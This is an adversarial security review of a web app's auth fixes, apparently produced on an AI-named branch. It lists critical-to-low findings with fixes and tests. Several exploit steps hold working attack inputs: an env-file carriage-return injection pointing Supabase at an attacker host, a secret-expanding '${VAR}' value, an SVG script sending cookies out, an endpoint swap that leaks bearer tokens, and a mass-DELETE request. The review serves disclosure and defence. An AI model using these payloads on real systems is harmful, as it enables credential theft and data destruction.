---
phase: 02-unified-retrieval-pipeline-tenant-scope
reviewed: 2026-11-23
depth: deep (adversarial, security only)
scope: all `fix(security):` commits (9a8cbf2..b7588da, 19 commits) plus the Gmail draft-to-send removal (5c70fad)
audit: 02-API-AUTH-AUDIT.md
findings:
  critical: 1
  high: 4
  medium: 6
  low: 8
status: issues_found
---

# Phase 2: adversarial review of the security fixes

Branch `claude/ecstatic-hamilton-86gtwv`. This was a read-only review; no code was changed. Line numbers refer to the current HEAD.

## Verdict

Most of the batches close the hole the audit described, on every HTTP method. The auth helpers fail closed: a 503 when the lookup throws, a 401 with no identity, a 403 for a non-admin or non-member. The `admin_session` cookie is HMAC-signed and has an expiry. It is checked in constant time, and `admin_users` is checked again on every request. `mcp/execute` is gone.

Four classes of problem remain:

1. **Single-tenant mode.** "Session required" does not protect much there, because anyone can create an account and row-level security (RLS) gives every authenticated user full access to the knowledge base (CR-01).
2. **Admin routes that edit `.env.local` without the allowlist.** Several admin routes write the file by string concatenation, so they bypass the allowlist the C1 fix relies on. One path needs only a carriage return (HI-01).
3. **Approved MCP calls can still be changed after approval, and the operator's MCP account is open to every user.** The approve path rewrites approved Gmail parameters from a cache shared across users (HI-02). The operator's MCP account stays reachable through `/api/chat` (HI-03).
4. **The local config server is still an unauthenticated, CSRF-able `.env` editor.** It runs on all interfaces, and the web-side lockdown now depends on it (HI-04).

---

## Critical

### CR-01: In single-tenant mode, a self-registered account can still delete or overwrite the whole knowledge base, through the "fixed" routes or directly through PostgREST

**Files:**
- `supabase/single-tenant-setup.sql:735-736`: the policy `FOR ALL USING (auth.role() = 'authenticated')` on `documents` (and the same on `document_chunks`).
- `src/app/api/documents/[id]/route.ts:81-87`: in single-tenant mode the predicate is `{ kind: 'none' }`.
- `src/app/api/images/route.ts:89-95`
- `src/app/api/process-document/route.ts:571-589`
- `src/app/api/scrapers/scrape/route.ts:24-39` and `scrapers/crawl`
- `src/app/api/ai-to-rag/route.ts:205-214`

**Exploit:**
1. Call `POST {NEXT_PUBLIC_SUPABASE_URL}/auth/v1/signup` with the public anon key. The signup page at `src/app/auth/signup/page.tsx` is not gated by deployment mode, and the endpoint can be called even without the UI.
2. Confirm the mailbox if confirmation is on.
3. Either loop `DELETE /api/documents/<id>` (the ids come from the anonymous-readable `documents` table), or skip the API and call `DELETE /rest/v1/documents?id=not.is.null` with the user's JWT.

All the single-tenant "require a session" fixes (C2, C3, H8, upload) only moved the bar from "no account" to "any account". The audit's own rubric rates that critical ("with no account (or with any account)"). The `read_only_doc_dashboard` admin setting is never enforced on the server: it is read only in `src/lib/admin-utils.ts` and the UI.

**Fix:**
- In single-tenant mode, require `requireAdminRequest` (or at least honour `read_only_doc_dashboard` for non-admins) for these operations: documents/images DELETE and PATCH, permanent process-document writes, scrape, crawl and ai-to-rag.
- Tighten the single-tenant RLS to `SELECT` for `authenticated`, plus writes only for `EXISTS (SELECT 1 FROM admin_users WHERE id = auth.uid())`, and do all server writes through the service role.
- At minimum, have startup fail when single-tenant mode runs with public signups enabled, or document that requirement.

**Tests to add:**
- `tests/rag/documents-route.test.ts`: "single-tenant: a signed-in non-admin DELETE gives 403 and deletes nothing". Do the same for images DELETE, process-document (not temporary), scrape and ai-to-rag.
- A SQL policy test (pgTAP or a script under `scripts/rag/`): with an `authenticated` JWT that is not in `admin_users`, `DELETE FROM documents` affects 0 rows.

---

## High

### HI-01: Admin env writers bypass the allowlist: CR injection, `$` replacement patterns and `${VAR}` expansion

The C1 design says secrets, tenant-mode switches and traffic-redirecting variables are never writable or readable over the web. Only `src/app/api/config/route.ts` enforces this. The other admin writers do not.

**(a) Carriage-return key injection.** `src/app/api/config/rag-prompt/route.ts:281-289` escapes only `\n`. A `\r` survives into `RAG_PRE_CONTEXT=...` (lines 102-105). dotenv 16.6.1 and `@next/env` normalise a lone `\r` to a newline. I verified this against a synthetic file: `RAG_PRE_CONTEXT=hello\rSUPABASE_URL=https://evil` loads as `SUPABASE_URL=https://evil`.

Exploit: an admin, or anyone holding a stolen 12-hour `admin_session` cookie, sends:

```
POST /api/config/rag-prompt {"preContext":"x\rNEXT_PUBLIC_SUPABASE_URL=https://attacker\rNEXT_PUBLIC_MYRAG_DEPLOYMENT_MODE=single-tenant"}
```

Every service-role request, which carries the service key in its `apikey` and `Authorization` headers, then goes to the attacker. Flipping the deployment mode also collapses tenant isolation.

**(b) `$` patterns in `String.prototype.replace` replacements.** These lines build the replacement string from admin-controlled JSON:
- `src/app/api/config/models/route.ts:64-97`
- `src/app/api/mcp/servers/route.ts:119-131`
- `src/app/api/mcp/servers/[id]/route.ts:100-111` and `[id]/test`
- `src/app/api/config/rag-prompt/route.ts:105,119`

`JSON.stringify` does not escape `$`. A `displayName` of ``"$`"`` copies the whole file text before the match (including `SUPABASE_SERVICE_ROLE_KEY=...` when it comes first) into `NEXT_PUBLIC_OPENAI_MODELS`, and the rest of that text becomes duplicate lines. `config/reload` then copies `NEXT_PUBLIC_*` into `process.env`, and the unauthenticated `GET /api/config/get-env?var=NEXT_PUBLIC_OPENAI_MODELS` (`src/app/api/config/get-env/route.ts:23-35`) returns it.

**(c) `${VAR}` expansion.** `@next/env` runs dotenv-expand, which I verified: `NEXT_PUBLIC_APP_NAME=${SECRET_K}` loads as the secret. Even the allowlisted `POST /api/config` accepts `{"config":{"NEXT_PUBLIC_APP_NAME":"${SUPABASE_SERVICE_ROLE_KEY}"}}` (`route.ts:299-313` checks only `[\r\n\0]`). After the next dev reload or restart, `GET /api/config/get-env?var=NEXT_PUBLIC_APP_NAME` returns the service role key to anyone, and the next build inlines it into the client bundle.

**Fix:**
- Route every `.env.local` write through one helper that:
  - rejects any name not in `CONFIG_WRITABLE_ENV_NAMES`;
  - rejects values that contain `\r`, `\n`, `\0`, `U+2028`, `U+2029` or `$`, or writes them single-quoted with `'` escaped (single-quoted values are not expanded);
  - never uses `String.replace` with a replacement string built from data (use a function replacer, or rebuild the file line by line as `config/route.ts` does).
- Add `RAG_PRE_CONTEXT`, `RAG_POST_CONTEXT`, `NEXT_PUBLIC_*_MODELS` and `MCP_CUSTOM_SERVERS` to an explicit list of structured-value names that use that helper.
- `get-env` should apply the same `isReadableEnvEntry` filter.

**Tests to add:**
- `tests/api/config-admin-routes.test.ts`:
  - "rag-prompt POST with `\r` in preContext answers 400 and leaves the env file unchanged".
  - "models POST with ``$` `` / `$'` in a displayName writes the literal characters and adds no line".
- `tests/api/config-route.test.ts`: "a value containing `${` is rejected".
- `tests/mcp/server-routes-auth.test.ts`: "a server name containing ``$` `` does not duplicate env lines".

### HI-02: The approve path still rewrites an approved Gmail call's recipient, thread and subject from a cache shared by every user

**File:** `src/app/api/chat/approve/route.ts`
- Line 16 and lines 18-…: `global_cache = globalThis`, so the cache is per process, not per user.
- Lines 3079-3105: the cache is filled from any user's `find_email` results.
- Lines 1712-1930: `reply_to_email` and `create_draft_reply`:
  - lines 1823-1825 fall back to `lastFoundEmail`;
  - line 1887 sets `optimizedParams.to = senderEmail`;
  - line 1919 unconditionally overwrites `thread_id`;
  - line 1928 overwrites `subject`.
- Lines 597-606 do the same in `transformToolParameters`.

**Exploit / failure:**
1. User A searches email. `lastFoundEmail` is now A's message.
2. User B approves a `gmail_reply_to_email` whose shown parameters name recipient X.
3. After the approval click, the server replaces `to` with A's sender and threads the reply into A's thread, then sends it. `reply_to_email` sends immediately.

This is the same integrity class as the removed draft-to-send swap (5c70fad): the executed call is not the approved call. It also leaks email between users across tenants.

**Fix:**
- Execute exactly the stored, approved `toolCall.params`.
- Delete the cache-based auto-population, or move it to before the approval prompt so the user sees the final values.
- Key any email cache by `ownerUserId` + `sessionId`, never by process.

**Test to add:** `tests/mcp/approve-auth.test.ts`: "approving a reply_to_email executes with the approved `to`/`thread_id`/`subject` even when `globalThis.gmailCache.lastFoundEmail` holds another user's message". Spy on the MCP client's `callTool` arguments.

### HI-03: The owner-scoped approval (H3) and the deletion of `mcp/execute` (C4) leave the operator's MCP account open to every chat caller

**File:** `src/app/api/chat/route.ts`
- Lines 1401-1410 and 1683-1712: the MCP endpoint is the operator-global `MCP_ZAPIER_ENDPOINT`.
- Lines 1683-1685: `data.settings.mcpEnabled` comes from the request body.
- Lines 2756, 2853 and 3097: YOLO mode runs tools without any approval.
- Lines 1235-1246: anonymous callers get `scope = null` and continue.

**Exploit:**
- **Multi-tenant mode:** any self-registered user writes "find my latest emails", approves their own tool call (they own it, so the fixed `chat/approve` allows it), and reads or sends from the operator's Gmail, Calendar or Drive.
- **YOLO mode (`NEXT_PUBLIC_MCP_YOLO_MODE_ENABLED=true`, which is on the admin-writable allowlist):** this works anonymously in both modes.

**Fix:**
- In multi-tenant mode, gate MCP in `/api/chat` to `requireAdminRequest`, or to an explicit per-user MCP grant.
- Never let anonymous callers reach the MCP branch. Ignore `settings.mcpEnabled` when there is no session.
- Remove `NEXT_PUBLIC_MCP_YOLO_MODE_ENABLED` from `CONFIG_WRITABLE_ENV_NAMES`, and refuse YOLO in multi-tenant mode.

**Test to add:** `tests/mcp/chat-mcp-gate.test.ts`:
- "anonymous chat with `settings.mcpEnabled: true` never builds MCP tools";
- "multi-tenant non-admin chat never receives Zapier tools".

### HI-04: `scripts/config-server.js` is an unauthenticated `.env` editor on all interfaces, open to CSRF file writes and DNS rebinding

The web lockdown (C1/H6) delegates secret management to this tool, so the tool's security now carries that load.

**File:** `scripts/config-server.js`
- Line 3671: `server.listen(PORT)` binds `0.0.0.0` with no auth and no `Host` check.
- Lines 182-201: `GET /api/config` returns every `.env.local` value, including `SUPABASE_SERVICE_ROLE_KEY`.
- Lines 99-117 and 1745-1765: multer `destination` uses `req.body.type` unsanitised (`path.join(REPO_ROOT,'public','logos', type)`, which allows traversal), and the extension comes from `originalname`.
- Lines 1768-1777: the favicon is written to `public/favicon${extname(originalname)}`, with any extension.

**Exploit:**
1. **CSRF to stored XSS.** The operator runs `npm run config` and visits any page. That page auto-submits a `multipart/form-data` POST (a simple request, so there is no preflight) to `http://localhost:3333/api/config/upload-favicon` with `favicon.html`. The file lands at `public/favicon.html`, on the app origin `localhost:3000`, which is same-site with the operator's Supabase and `admin_session` cookies. The Supabase SSR cookies can be read by JavaScript. The page then opens `http://localhost:3000/favicon.html`, which runs the attacker's script.
2. **DNS rebinding.** The attacker's domain re-resolves to 127.0.0.1, then calls `GET :3333/api/config` and reads every secret.
3. **LAN.** Anyone on the network can call `GET http://<operator-ip>:3333/api/config`.

**Fix:**
- `server.listen(PORT, '127.0.0.1')`.
- Reject requests whose `Host` is not `localhost:3333` or `127.0.0.1:3333`, and reject any `Origin` that is not the tool's own.
- Require a random per-launch token (printed to the console and stored in `sessionStorage`) on every `/api/*` call.
- Allow `type` only from `{'header','ai'}`, and only `.png`, `.svg` or `.ico` extensions.

**Tests to add:** `tests/scripts/config-server-security.test.ts`, using supertest against the exported app:
- `Host: evil.example` gives 403;
- an upload with `type=../../src` or `favicon.html` gives 400 and writes nothing;
- `GET /api/config` without the launch token gives 401.

---

## Medium

### ME-01: `NEXT_PUBLIC_SITE_URL` can be written over the web but steers server-side requests that carry users' cookies

**Files:**
- `src/lib/config-env-allowlist.ts:145`: the name is on the allowlist.
- `src/app/api/nango/connections/route.ts:162-167`: forwards the caller's whole `Cookie` header, including the Supabase session and `admin_session`, to `${NEXT_PUBLIC_SITE_URL}/api/nango/sync`.
- `src/lib/whatsapp/session-manager.ts:84,421`: the webhook URL registered with Baileys.
- `src/lib/whatsapp/webhook-handler.ts:360-362`
- `src/app/api/organizations/[id]/invites/route.ts:258`: the invite URL.
- `scripts/config-server.js:44-51`: the proxy base URL, used when `MYRAG_APP_URL` is empty.

**Exploit:** an admin, or a stolen `admin_session` cookie, sets `NEXT_PUBLIC_SITE_URL=https://attacker`. From then on:
- every user who connects Drive, Dropbox or Notion has their session cookies posted to the attacker;
- WhatsApp sessions created later deliver inbound messages to the attacker;
- invites point at a phishing host.

The allowlist's own docstring says traffic-redirecting variables are excluded.

**Fix:**
- Remove `NEXT_PUBLIC_SITE_URL` from `CONFIG_WRITABLE_ENV_NAMES`.
- For the background sync, call `syncDocumentsForConnection` in-process instead of going over HTTP, or call `new URL('/api/nango/sync', request.url)` and forward only the Supabase auth cookies.
- In `config-server.js`, refuse to forward credentials unless the base URL comes from `MYRAG_APP_URL`.

**Tests to add:**
- `tests/api/config-route.test.ts`: "NEXT_PUBLIC_SITE_URL is rejected".
- `tests/nango/connections-route.test.ts`: "POST never sends the Cookie header to a host other than the request origin".

### ME-02: An MCP server PUT keeps the stored credentials when the endpoint changes, so an admin can pull out credentials that the redaction is meant to hide

**Files:**
- `src/app/api/mcp/servers/[id]/route.ts:258-276`: `mergeWithStored` keeps the stored `token`, `apiKey` or `password` whenever the incoming ones are blank, even when `endpoint` is new.
- `[id]/test/route.ts:93-102` and `[id]/route.ts:139-148`: send them to `server.endpoint`.

**Exploit:** `PUT /api/mcp/servers/foo {"endpoint":"https://attacker/x","authentication":{"type":"bearer"}}`, then `POST /api/mcp/servers/foo/test`. The stored bearer token arrives at the attacker. This defeats the "reads never return credentials" goal of the H6 fix.

**Fix:**
- When `new URL(merged.endpoint).origin !== new URL(stored.endpoint).origin`, drop the stored credentials and require them to be re-entered.
- Optionally refuse private and link-local IPs in `test`.

**Test to add:** `tests/mcp/server-routes-auth.test.ts`: "changing the endpoint origin with blank credentials clears the stored credentials; the test call sends no Authorization header".

### ME-03: RLS on `nango_connections` lets any user write `connection_id` directly, bypassing the C5 `end_user` check

**Files:**
- `supabase/multi-tenant-setup.sql:2039-2047`: `INSERT WITH CHECK (auth.uid() = user_id)` and `UPDATE USING (auth.uid() = user_id)`, with no restriction on `connection_id`.
- `src/app/api/nango/connections/route.ts:133-136`: the check that this bypasses.

**Exploit:** call `PATCH /rest/v1/nango_connections?user_id=eq.<self>` with `{"connection_id":"<victim conn>"}` (or POST a new row). The browse routes then read the victim's Drive or Notion through `nango.proxy`.

`UNIQUE(connection_id)` blocks this only while the victim's row exists. Two paths leave a live Nango connection with no row:
- `DELETE` continues after a failed `nango.deleteConnection` (`connections/route.ts:328-340`);
- connection ids leaked by the old `config/connectors` (H5) are still valid.

**Fix:** revoke `INSERT` and `UPDATE` on `nango_connections` from `authenticated`, so only the service role writes. If user writes must stay, add a trigger that forbids changing `connection_id`. On a failed Nango delete, keep the row as `status='orphaned'` rather than freeing the id.

**Test to add:** a SQL policy test: "an authenticated user cannot insert or update `nango_connections.connection_id`". In `tests/nango/connections-route.test.ts`: "DELETE keeps the row when the Nango delete fails".

### ME-04: Unauthenticated routes that spend operator keys, missed by the audit (same class as the S8 generate-* fix)

The audit's "17 skipped (no tenant data)" bucket hides these. Each one spends the operator's API keys with no session:

| Route | Spend |
|---|---|
| `src/app/api/audio/route.ts` POST (lines 159-) | OpenAI TTS and Whisper |
| `src/app/api/title/route.ts:12` | LLM (`generateSmartTitle`) |
| `src/app/api/extract-name/route.ts:49` | OpenAI chat |
| `src/app/api/web-search/route.ts:11` | OpenRouter/Exa |
| `src/app/api/config/system-prompts/translate/route.ts:3` | OpenAI/OpenRouter, using the operator key |
| `src/app/api/process-document/route.ts:571,640` with `isTemporary=true` | LlamaCloud parse, up to 20 MB, with no session in either mode |
| `src/app/api/embed/chat` | Public by design, but its rate limiter `src/lib/embed-rate-limit.ts:49-58` keys on a client-supplied `X-Forwarded-For` and `Origin`, so setting new values bypasses it |

**Fix:**
- Add `requireSessionUser` to title, extract-name, web-search, audio POST and process-document `isTemporary`.
- Make translate `requireAdminOrDeny`.
- Key the embed limit on the platform-provided IP only, without `Origin`.

**Test to add:** extend `tests/api/generate-routes-auth.test.ts` with one 401 case per route.

### ME-05: `whatsapp/monitor` lets any user with one session stop or start monitoring for all tenants

**File:** `src/app/api/whatsapp/monitor/route.ts:67-86`. `requireOwnedSession` checks ownership of `body.sessionId`, but `start` and `stop` call `startGlobalMonitoring()` and `stopGlobalMonitoring()` (lines 71 and 80), which act on every tenant's sessions.

**Exploit:** a user with any WhatsApp session posts `{"action":"stop","sessionId":"<own>"}`. Automatic reconnection stops for every tenant.

**Fix:** use `requireAdminOrDeny` for `start` and `stop`. Keep the owned-session check for `force_reconnect` only.

**Test to add:** `tests/whatsapp/routes.test.ts`: "a non-admin owning a session gets 403 for stop/start and the global monitor is untouched".

### ME-06: Admin-uploaded SVG is served from the app origin (stored XSS)

**Files:** `src/app/api/config/upload-logo/route.ts:34-61` and `upload-favicon/route.ts:25-41` accept `.svg` with any content and no size limit, and write it under `public/`.

**Exploit:** an admin (or a stolen admin cookie) uploads `<svg><script>fetch('//x/'+document.cookie)</script></svg>`. Any user who opens `/logos/header/header-logo-<ts>.svg` has their Supabase SSR session cookie read, because that cookie is not HttpOnly.

**Fix:** either sanitise the SVG (strip `script`, `foreignObject` and `on*` attributes, for example with DOMPurify in SVG mode), or serve uploads with `Content-Security-Policy: sandbox` and `Content-Disposition: attachment` through a route instead of `public/`. Add a size cap.

**Test to add:** `tests/api/config-admin-routes.test.ts`: "an SVG with `<script>` is rejected or stored sanitised".

---

## Low

### LO-01: The WhatsApp webhook accepts unsigned requests outside production and has no replay protection

**Files:**
- `src/app/api/whatsapp/webhook/route.ts:12,23-24`: the check is `NODE_ENV === 'production'`, so a `next dev` server exposed through a tunnel (the usual way to receive Baileys webhooks) accepts forged messages.
- The HMAC covers only the body, with no timestamp or nonce, so a captured webhook can be replayed forever and triggers repeated AI replies.
- Line 54 logs the full message payload (phone numbers and text).

**Fix:**
- Fail closed whenever the secret is unset, unless `WHATSAPP_WEBHOOK_ALLOW_UNSIGNED=true`.
- Sign `timestamp.body` in `baileys-whatsapp/server.ts:85-92` and reject requests older than 5 minutes.
- Log only the event type and id.

**Test to add:** "an unset secret with NODE_ENV=development and no opt-in gives 503"; "a valid signature with a stale timestamp gives 401".

### LO-02: The `admin_session` cookie lives on after Supabase logout, and the missing-key path is untested

**File:** `src/lib/admin-session.ts:12-51`.
- The cookie is not tied to the Supabase session. Signing out of Supabase leaves a 12-hour admin capability, and nothing can revoke a stolen cookie except removing the `admin_users` row or rotating `SUPABASE_SERVICE_ROLE_KEY`.
- `requireAdminRequest` (lines 110-121) accepts the cookie with no session at all.
- The key is derived from the service-role key, which is fine. However, no test covers `SUPABASE_SERVICE_ROLE_KEY=''`, which should make login answer 503 and every cookie fail.

**Fix:** put the Supabase session id or `auth.users.updated_at` into the signed payload and check it, or require `getUser()` to equal the cookie's `userId`. Add a `jti` stored on logout for revocation.

**Test to add:** in `tests/api/admin-auth.test.ts`: "with an empty service-role key, login gives 503 and a previously minted cookie gives 401"; "a cookie without a matching Supabase session is refused".

### LO-03: Wildcard CORS is still present

**Files:**
- `src/app/api/config/models/route.ts:186,197,265,285,293`: GET, POST and OPTIONS. GET is also unauthenticated (line 250: "Skip admin authorization").
- `src/app/api/config/rag-prompt/route.ts:316`: OPTIONS.

These contradict the S7 "no CORS `*`" claim. They do not allow credentialed reads, but GET exposes the model configuration to any origin.

**Fix:** remove the headers and the OPTIONS handlers.

**Test to add:** assert there is no `Access-Control-Allow-Origin` header.

### LO-04: `mcp/tools` GET gives any signed-in user the operator's tool catalogue and unredacted errors

**File:** `src/app/api/mcp/tools/route.ts:65-79` returns `error.message` raw, while `health` uses `redactUrls`. MCP transport errors can contain the endpoint URL, and the Zapier URL carries the secret. Every user also sees the schemas of the operator's connected apps.

**Fix:** use `redactUrls(error.message)`. In multi-tenant mode, return tools only to admins, in line with HI-03.

### LO-05: RLS on `tool_execution_states` lets a user plant rows with any `user_id`

**Files:**
- `supabase/multi-tenant-setup.sql:1763-1769` and `single-tenant-setup.sql:833-842`: the INSERT and UPDATE checks cover only `chat_id`, not `user_id`.
- `ToolExecutionStateService.getForUser` (`src/lib/tool-execution-state.ts:203`) trusts `row.user_id === userId`.

**Exploit:** an attacker inserts a row in their own chat with `user_id=<victim>`, `tool_call_id=<victim's>` and `status='completed'`. The victim's approval then gets 409. Separately, `ToolExecutionStateService.update(tool_call_id)` (used in the approve route at about line 1243) updates every owner's row that shares the `tool_call_id`. Both need the victim's tool call id.

**Fix:**
- Add `WITH CHECK (user_id IS NULL OR user_id = auth.uid())`, or revoke writes from `authenticated`.
- Use `updateById(persistentState.id)` in approve.

### LO-06: The `UNIQUE(connection_id)` migration aborts on existing duplicates

**Files:** `supabase/multi-tenant-setup.sql` and `single-tenant-setup.sql` (the S4 DO block). A database that was exploited before the fix contains exactly these duplicates, so `ALTER TABLE ... ADD CONSTRAINT` fails and the rest of the setup script does not run.

**Fix:** before adding the constraint, delete or mark the duplicates (keep the row whose `user_id` matches Nango's `end_user.id`, or the oldest), and report them.

### LO-07: The organization owner-grant checks run on rows that RLS hides, and PATCH cannot succeed

**Files:**
- `src/app/api/organizations/[id]/members/[userId]/route.ts:72-111`: the user-scoped client reads `targetMember`, but the SELECT policy (`multi-tenant-setup.sql:1476-1483`) shows a non-owner only their own row. A non-owner admin therefore always sees `targetMember = null`, so the "only an owner can change an owner" check passes vacuously.
- There is no UPDATE policy on `organization_members`, so the role update fails for everyone, owners included.

Nothing can be exploited today, because RLS denies the update. But the S8 tests pass only because of mocks, and adding an UPDATE policy later would expose the vacuous check.

**Fix:** do the reads and writes with the service role after the membership check, and add an explicit UPDATE policy limited to owners.

**Test to add:** an integration test against the real policies.

### LO-08: Minor items

- `src/app/api/config/rag-prompt/route.ts:224`: GET writes `.env.local` (the split prompt). The `admin_session` cookie is `SameSite=Lax`, so a top-level cross-site navigation can trigger this write. Move the write to POST.
- The Polar webhook (`src/app/api/webhooks/route.ts`) does not record `webhook-id` values, so a request can be replayed within the 5-minute window. The handler is disabled today; deduplicate before re-enabling it.
- `src/app/api/chat/approve/route.ts:1271`: when the in-memory entry is missing but a persistent row exists (for example after a restart), the route throws a TypeError and answers 500. This fails closed, but approvals after a cold start are broken.

---

## Test quality spot-check

I read these tests:
- `admin-auth`
- `config-route`
- `config-admin-routes`
- `documents-route`
- `images-route`
- `approve-auth`
- `tool-execution-state-route`
- `nango/*`
- `whatsapp/webhook-signature`
- `internal-api-key`
- `polar-webhook`

They import the real route modules and mock only Supabase and the session lookup. On the old code they fail the way they should: 200 instead of 401 or 403, an unsigned UUID cookie accepted, `===` with no `timingSafeEqual` spy call. Gaps:
- No test writes `\r`, `$` or `${` through any env writer (HI-01). The only injection test sends `\n` to `config/route.ts`.
- No single-tenant "signed-in non-admin" destructive-operation test exists (CR-01). The single-tenant tests treat any session as authorised.
- No test for a missing signing key (LO-02).
- No test that approved parameters equal executed parameters (HI-02).
- The organization tests mock RLS, so they cannot catch LO-07.

## Remaining unauthenticated mutating or spend routes the audit did not list

- `audio` POST, `title` POST, `extract-name` POST, `web-search` POST, `config/system-prompts/translate` POST, and `process-document` with `isTemporary` (ME-04).
- `config/system-prompts/validate` POST (no spend, just CPU), and `config/models` GET with CORS `*` (LO-03).
- `whatsapp/webhook` outside production (LO-01).
- `create-checkout` and `create-stripe-checkout` create Stripe or Polar sessions without a session. That is low impact (no data), but checkout objects can be created in bulk.

## Routes confirmed OK (the hole is closed on every method, in both modes, and error paths fail closed)

- `admin/check`, `admin/login` (POST/DELETE), `admin/settings` (GET/POST), `admin/status`, `admin/logout`. The identity comes from `getUser` or a Bearer token checked with `auth.getUser`; the cookie is HMAC-signed with an expiry and compared in constant time; `admin_users` is checked again on every request; the Cookie header is not logged.
- `documents/[id]` DELETE/PATCH and `images` GET/DELETE in multi-tenant mode: session, `resolveTenantScope` with a membership check, the predicate applied to both the lookup and the write, 404 when not owned. Single-tenant mode: see CR-01.
- `ai-to-rag`: the owner comes from the session, a body `userId` that differs gives 403, the organization is checked for membership, and the single-tenant insert omits `user_id`.
- `mcp/execute`: deleted, with no remaining callers.
- `chat/approve`: the session and recorded owner are enforced before any state write (but see HI-02 and HI-03).
- `tool-execution-state` GET/POST/PUT: owner-scoped, PUT is limited to an allowlist of fields, and the placeholder chat id never lists rows (RLS residue: LO-05).
- `nango/connections` (GET/POST/PATCH/DELETE), `nango/files`, `nango/folders`, `nango/notion/pages`, `nango/session`, `nango/sync`: the Bearer bypass is gone, every query filters on the session user, and POST checks `end_user.id` (RLS residue: ME-03; cookie forwarding: ME-01).
- `whatsapp/test` and `whatsapp/test-numbers`: 404 in production, otherwise a session plus an owned session.
- `whatsapp/webhook` in production: 503 without a secret, HMAC compared through sha256 and `timingSafeEqual`.
- `process-document`, `scrapers/scrape` and `scrapers/crawl` in multi-tenant mode: a session plus `verifyUserOrganizationAccess`.
- `upload`: a session is required; the storage path is `${user.id}/<sanitised>`, so no traversal; SVG and HTML MIME types are not allowed.
- `config` GET/POST: admin-only; the name allowlist is exact and case-sensitive (`rag_pipeline`, `__proto__` and padded names are rejected); `\r\n\0` are rejected; the response is no-store (the `${` gap is in HI-01).
- `config/connectors`: aggregate statistics only, and PUT is admin-only.
- `config/reload`, `config/upload-logo`, `config/upload-favicon`: admin-only (content issue: ME-06).
- `config/models` POST and `config/rag-prompt` GET/POST: the auth gate is correct (the writer bugs are in HI-01).
- `mcp/servers` GET/POST, `mcp/servers/[id]` GET/PUT/DELETE/POST, `mcp/servers/[id]/test`, `mcp/health`: admin-only, reads return only the host and a `hasCredentials` flag, and CORS `*` is removed (ME-02 remains).
- `mcp/tools` POST: admin-only.
- `generate-image`, `generate-video`, `generate-3d`: `requireSessionUser` returns 401, or 503 on an auth outage; the scope is resolved with the verified user.
- `organizations/*` and `invites/[token]`: `getUser()` throughout; an admin cannot grant or remove `owner` (LO-07 is a robustness note).
- `webhooks` (Polar): Standard Webhooks HMAC, 5-minute tolerance, constant-time comparison, 503 without a secret.
- `internal/voice-chat` and `internal/voice-rag`: the `x-api-key` is compared through sha256 and `timingSafeEqual` before the signed scope token is checked; 503 when the key is unconfigured.
- Not regressed: `webhooks/stripe` (`constructEvent`), `nango/webhook` (HMAC with `timingSafeEqual`), `internal/rag/run` (`checkEvalAccess` with `timingSafeEqual`).
